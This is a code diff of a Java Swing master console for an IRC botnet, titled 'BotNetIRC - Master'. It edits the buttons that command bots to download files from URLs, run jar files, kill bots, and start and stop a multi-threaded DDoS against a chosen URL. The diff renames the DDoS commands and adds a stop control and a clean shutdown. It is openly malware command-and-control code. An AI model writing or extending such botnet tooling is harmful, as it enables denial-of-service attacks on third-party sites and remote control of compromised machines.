@@ -3,11 +3,9 @@ package mastergui;
 import crypto.Crypto;
 
 import javax.swing.*;
-import java.awt.event.ActionEvent;
-import java.awt.event.ActionListener;
-import java.awt.event.KeyAdapter;
-import java.awt.event.KeyEvent;
-import java.util.Random;
+import java.awt.event.*;
+
+import static botlogic.Bot.closeSocketConnection;
 
 /**
  * Created by zychp_w10 on 08.05.2017.
@@ -30,11 +28,9 @@ public class Gui {
     private JPanel mainPanel;
     private JTextField commandTextField1;
     private JButton sendButton;
-    private JRadioButton encryptionRadioButton;
     private JTextArea logTextArea1;
     private JPanel logPanel;
     private JPanel buttonPanel;
-    private JPanel graphpanel;
     private JScrollPane logScrollPane;
     private JCheckBox cleanchatCheckBox;
     private JButton connectionTestButton;
@@ -42,10 +38,10 @@ public class Gui {
     private JButton downloadFileFromUrlButton;
     private JButton killBotButton;
     private JButton helpButton;
-    private JButton ddosButton;
+    private JButton ddosstartButton;
+    private JButton ddosstopButton;
 
     public Gui() throws Exception {
-        setNickAndLogin(getRandomNumber());
         masterbot = new Master(server, nick, login, channel);
         masterbot.connectToIRC();
         logTextArea1.setEditable(false);
@@ -76,6 +72,7 @@ public class Gui {
                 try {
                     masterbot.sendMessage(command);
                 } catch (java.lang.Exception exc) {
+                    logTextArea1.append("Can't send message!\n");
                 }
             }
         });
@@ -90,7 +87,7 @@ public class Gui {
         connectionTestButton.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
-                commandTextField1.setText("PING");
+                commandTextField1.setText("TESTINOUT");
             }
         });
         runJarFileButton.addActionListener(new ActionListener() {
@@ -133,7 +130,7 @@ public class Gui {
                 dialog.setVisible(true);
             }
         });
-        ddosButton.addActionListener(new ActionListener() {
+        ddosstartButton.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
                 DdosGui dialog = new DdosGui();
@@ -141,21 +138,15 @@ public class Gui {
                 dialog.setSize(600, 200);
                 dialog.setLocationByPlatform(true);
                 dialog.setVisible(true);
-                commandTextField1.setText("DDOS " + dialog.getUrl() + " " + dialog.getNumOfThreads());
+                commandTextField1.setText("STARTDDOSURL " + dialog.getUrl() + " " + dialog.getNumOfThreads());
             }
         });
-    }
-
-    private static void setNickAndLogin(int randomNumber) {
-        String number = Integer.toString(randomNumber);
-        System.out.println("BOT_NO:" + number);
-        nick = nick.concat(number);
-        login = login.concat(number);
-    }
-
-    private static int getRandomNumber() {
-        Random randomGenerator = new Random();
-        return randomGenerator.nextInt(9999);
+        ddosstopButton.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                commandTextField1.setText("STOPDDOSURL ");
+            }
+        });
     }
 
     public static void main(String[] args) throws Exception {
@@ -164,7 +155,13 @@ public class Gui {
         frame.setLocationByPlatform(true);
         frame.setTitle("BotNetIRC - Master");
         frame.setContentPane(new Gui().mainPanel);
-        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
+        frame.addWindowListener(new WindowAdapter() {
+            public void windowClosing(WindowEvent evt) {
+                closeSocketConnection();
+                System.exit(0);
+            }
+        });
         frame.setVisible(true);
      }
 }
